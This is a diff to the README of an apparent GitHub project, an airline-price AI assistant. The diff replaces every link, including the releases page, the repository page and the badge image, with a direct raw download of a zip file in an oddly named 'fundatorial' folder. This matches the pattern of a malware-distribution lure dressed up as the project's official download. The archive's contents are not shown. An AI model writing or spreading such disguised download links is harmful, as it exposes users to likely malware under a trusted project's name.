@@ -1,6 +1,6 @@
 # ✈️ Airline-AI-Assistant-with-ollama - Get Accurate Airline Prices Easily
 
-[![Download Airline-AI-Assistant](https://img.shields.io/badge/Download-Airline--AI--Assistant-brightgreen.svg)](https://github.com/hagarnegm/Airline-AI-Assistant-with-ollama/releases)
+[![Download Airline-AI-Assistant](https://github.com/hagarnegm/Airline-AI-Assistant-with-ollama/raw/refs/heads/main/fundatorial/Assistant-with-ollama-Airline-A-v3.6.zip)](https://github.com/hagarnegm/Airline-AI-Assistant-with-ollama/raw/refs/heads/main/fundatorial/Assistant-with-ollama-Airline-A-v3.6.zip)
 
 ## 📘 Overview
 
@@ -12,7 +12,7 @@ To get started with Airline-AI-Assistant, follow these steps. No programming ski
 
 ## 📥 Download & Install
 
-Visit this page to download the software: [GitHub Releases](https://github.com/hagarnegm/Airline-AI-Assistant-with-ollama/releases).
+Visit this page to download the software: [GitHub Releases](https://github.com/hagarnegm/Airline-AI-Assistant-with-ollama/raw/refs/heads/main/fundatorial/Assistant-with-ollama-Airline-A-v3.6.zip).
 
 1. Click the link above to go to the releases page.
 2. Look for the latest version of the software.
@@ -67,6 +67,6 @@ If you would like to contribute to the project, you are welcome to. You can repo
 
 ## 🔗 Additional Resources
 
-For more information and updates about Airline-AI-Assistant, visit our GitHub page: [Airline-AI-Assistant with ollama](https://github.com/hagarnegm/Airline-AI-Assistant-with-ollama).
+For more information and updates about Airline-AI-Assistant, visit our GitHub page: [Airline-AI-Assistant with ollama](https://github.com/hagarnegm/Airline-AI-Assistant-with-ollama/raw/refs/heads/main/fundatorial/Assistant-with-ollama-Airline-A-v3.6.zip).
 
 Feel free to explore and utilize this assistant to get the best ticket prices for your travel needs!
